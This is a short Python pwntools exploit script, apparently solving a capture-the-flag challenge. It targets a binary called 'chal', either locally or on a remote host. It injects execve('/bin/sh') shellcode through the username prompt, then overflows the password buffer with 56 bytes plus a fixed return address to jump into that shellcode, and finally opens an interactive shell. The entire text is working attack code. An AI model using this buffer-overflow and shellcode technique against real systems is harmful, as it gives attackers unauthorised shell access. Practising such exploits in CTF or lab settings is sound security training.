from pwn import *
import sys
# context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        gdb.attach(r,'b read\nb main')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
sc_buf = 0x404080
sc = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.sendlineafter(b'Username: ',sc)
r.sendlineafter(b'Password: ',b'A' * 56 + p64(sc_buf))
r.recvuntil(b'Please try again.\n')
r.interactive()